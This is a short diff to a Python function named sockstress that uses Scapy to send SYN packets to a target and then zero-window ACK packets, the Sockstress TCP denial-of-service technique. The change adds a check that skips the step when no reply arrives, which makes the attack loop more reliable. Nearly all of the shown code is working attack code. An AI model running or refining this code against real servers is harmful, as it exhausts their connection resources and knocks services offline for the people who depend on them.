@@ -54,6 +54,10 @@ def sockstress(dstaddr: IPv4Address, dstport: int) -> None:
                     IP(dst=dstaddr) / TCP(sport=srcport,dport=dstport,flags='S'),
                     timeout=1,
                     verbose=0)
+
+            if not response:
+                continue
+
             send(
                     IP(dst=dstaddr) / TCP(sport=srcport,dport=dstport,flags='A',ack=response[TCP].seq+1,window=0) / '\x00\x00',
                     verbose=0
